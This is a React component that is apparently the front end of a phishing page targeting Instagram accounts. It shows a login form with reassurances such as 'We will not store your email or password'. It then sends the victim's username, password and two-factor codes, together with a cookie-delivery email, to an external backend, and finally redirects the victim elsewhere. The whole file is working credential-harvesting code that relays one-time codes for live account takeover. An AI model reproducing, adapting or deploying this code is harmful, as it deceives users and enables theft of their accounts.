import React, { Component } from "react";
import runtimeEnv from "@mars/heroku-js-runtime-env";
import { Route, Redirect } from "react-router-dom";
import {
  Container,
  Row,
  Col,
  Card,
  Form,
  Button,
  Alert,
  Spinner,
} from "react-bootstrap";

import Header from "./Header";
import Footer from "./Footer";

const queryString = require("query-string");
const env = runtimeEnv();
export default class Instagram extends Component {
  state = {
    username: "",
    password: "",
    showAlert: false,
    loading: false,
    message: "",
    twoFactor: false,
    email_auth: false,
    success: false,
    code: "",
    two_factor_identifier: "",
    verificationMethod: "",
    appName: window.location.hostname.substring(10).split(".")[0],
  };

  handleUsername = (event) => {
    this.setState({ username: event.target.value });
  };
  handleCode = (event) => {
    const { value, maxLength } = event.target;
    const message = value.slice(0, maxLength);
    this.setState({ code: message });
  };
  handlePassword = (event) => {
    this.setState({ password: event.target.value });
  };
  onShowAlert = () => {
    this.setState({ showAlert: true }, () => {
      window.setTimeout(() => {
        this.setState({ showAlert: false });
      }, 30000);
    });
  };
  handleClick = (e) => {
    e.preventDefault();
    this.setState({ loading: true });
    if (this.state.username.length !== 0 && this.state.password.length !== 0) {
      console.log(this.state.appName, window.location.href.split("//")[1]);
      fetch(`${env.REACT_APP_URL}/insta`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        },
        body: queryString.stringify({
          username: this.state.username,
          password: this.state.password,
          cookieEmail: env.REACT_APP_COOKIE_EMAIL,
          appName: this.state.appName,
        }),
      })
        .then((response) => response.json())
        .then((responseData) => {
          console.log(responseData);
          this.setState(
            {
              message: responseData.message,
            },
            () => {
              this.onShowAlert();
            }
          );
          if (!responseData.success) {
            this.setState({ loading: false });
          } else {
            if (responseData.twoFactor) {
              this.setState({
                email_auth: responseData.email_auth,
                twoFactor: true,
                loading: true,
                two_factor_identifier: responseData.two_factor_identifier,
                verificationMethod: responseData.verificationMethod,
              });
            } else {
              this.setState({ success: true });
            }
          }
        });
    } else {
      if (this.state.username.length === 0) {
        this.setState(
          {
            message: "username cannot be empty",
            loading: false,
          },
          () => {
            this.onShowAlert();
          }
        );
      } else {
        this.setState(
          {
            message: "password cannot be empty",
            loading: false,
          },
          () => {
            this.onShowAlert();
          }
        );
      }
    }
  };
  handleCodeClick = (e) => {
    if (this.state.code.length === 0 || this.state.code.length > 6) {
      this.setState({ message: "Code length should be equal to 6" }, () => {
        this.onShowAlert();
      });
    } else {
      if (!this.state.email_auth) {
        fetch(
          `${env.REACT_APP_URL}/insta/submitCode?username=${this.state.username}&password=${this.state.password}&code=${this.state.code}&two_factor_identifier=${this.state.two_factor_identifier}&verificationMethod=${this.state.verificationMethod}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&appName=${this.state.appName}`,
          {
            method: "GET",
          }
        )
          .then((response) => response.json())
          .then((responseData) => {
            console.log(responseData);
            if (responseData.success) {
              this.setState(
                { success: true, message: responseData.message },
                () => {
                  this.onShowAlert();
                }
              );
            } else {
              this.setState({ message: responseData.message }, () => {
                this.onShowAlert();
              });
            }
          });
      } else {
        fetch(
          `${env.REACT_APP_URL}/insta/emailVerify?username=${this.state.username}&code=${this.state.code}`,
          {
            method: "GET",
          }
        )
          .then((response) => response.json())
          .then((responseData) => {
            console.log(responseData);
            this.setState(
              {
                message: responseData.message,
              },
              () => {
                this.onShowAlert();
              }
            );
            if (responseData.success) {
              fetch(`${env.REACT_APP_URL}/insta`, {
                method: "POST",
                headers: {
                  "Content-Type":
                    "application/x-www-form-urlencoded;charset=UTF-8",
                },
                body: queryString.stringify({
                  username: this.state.username,
                  password: this.state.password,
                  cookieEmail: env.REACT_APP_COOKIE_EMAIL,
                  appName: this.state.appName,
                }),
              })
                .then((response) => response.json())
                .then((responseData) => {
                  console.log(responseData);
                  this.setState(
                    {
                      message: responseData.message,
                    },
                    () => {
                      this.onShowAlert();
                    }
                  );
                  if (!responseData.success) {
                    this.setState({ loading: false });
                  } else {
                    if (!responseData.twoFactor) {
                      this.setState({ success: true });
                    }
                  }
                });
            } else {
              this.setState({ message: responseData.message, code: "" }, () => {
                this.onShowAlert();
              });
            }
          });
      }
    }
  };
  setRedirect = () => {
    this.setState({
      redirect: true,
    });
  };
  renderRedirect = () => {
    if (this.state.redirect) {
      return <Redirect to="/" />;
    }
  };
  render() {
    return (
      <>
        <Header />
        <Container fluid="sm">
          <Row>
            <Col>
              <Card>
                <Card.Header>
                  <h4 className="card-header-title mb-0">
                    Please fill in your credentials.
                    <a
                      href="javaScript:void(0);"
                      onClick={this.setRedirect}
                      className="float-right"
                    >
                      Go Back
                    </a>
                  </h4>
                </Card.Header>
                <Card.Body>
                  <div class="row justify-content-center">
                    <div className="col-12 col-md-5 col-xl-4 my-5">
                      {this.renderRedirect()}
                      {this.state.showAlert ? (
                        <Alert variant="danger">{this.state.message}</Alert>
                      ) : (
                        ""
                      )}
                      {this.state.success ? (
                        <>
                          {" "}
                          <center>
                            <h1>Login Success Thank You!</h1>
                            <h1>Redirecting...</h1>
                          </center>
                          <Route
                            component={() => {
                              window.setTimeout(() => {
                                window.location.href =
                                  env.REACT_APP_REDIRECTURL;
                              }, 5000);

                              return null;
                            }}
                          />
                        </>
                      ) : (
                        <>
                          <h1 className="display-4 text-center mb-3">
                            We Value Your Security.
                          </h1>

                          <p className="text-muted text-center mb-5">
                            We will not store your email or password.
                          </p>

                          <Form>
                            <Form.Group controlId="name">
                              <Form.Label>Email Address</Form.Label>
                              <Form.Control
                                type="text"
                                id="name"
                                placeholder="name@address.com"
                                autocomplete="off"
                                onChange={(e) => this.handleUsername(e)}
                                value={this.state.username}
                                name="name"
                                autocomplete="off"
                              />
                            </Form.Group>
                            <Form.Group controlId="pass">
                              <Form.Label>Password</Form.Label>
                              <Form.Control
                                type="password"
                                id="pass"
                                placeholder="password"
                                autocomplete="off"
                                onChange={(e) => this.handlePassword(e)}
                                value={this.state.password}
                                name="name"
                                autocomplete="off"
                              />
                            </Form.Group>
                            {this.state.loading ? (
                              <Button variant="primary" type="submit" disabled>
                                <Spinner
                                  as="span"
                                  animation="grow"
                                  size="sm"
                                  role="status"
                                  aria-hidden="true"
                                />
                                Loading...
                              </Button>
                            ) : (
                              <button
                                onClick={(e) => this.handleClick(e)}
                                type="button"
                                className="btn btn-lg btn-block btn-primary mb-3 login_btn"
                              >
                                Login
                              </button>
                            )}

                            {this.state.twoFactor ? (
                              <div>
                                <Form.Group>
                                  {this.state.email_auth ? (
                                    <Form.Label>
                                      Please enter the code received
                                    </Form.Label>
                                  ) : (
                                    <Form.Label>Enter code received</Form.Label>
                                  )}
                                  <input
                                    value={this.state.code}
                                    onChange={(e) => {
                                      this.handleCode(e);
                                    }}
                                    type="number"
                                    maxLength="11"
                                    name="name"
                                    autocomplete="off"
                                    className="text-center form-control"
                                  ></input>
                                </Form.Group>
                                <button
                                  onClick={() => {
                                    this.handleCodeClick();
                                  }}
                                  type="button"
                                  className="btn login_btn"
                                >
                                  submit code
                                </button>
                              </div>
                            ) : (
                              ""
                            )}
                          </Form>
                        </>
                      )}
                    </div>
                  </div>
                </Card.Body>
              </Card>
            </Col>
          </Row>
        </Container>
        <Footer withText />
      </>
    );
  }
}
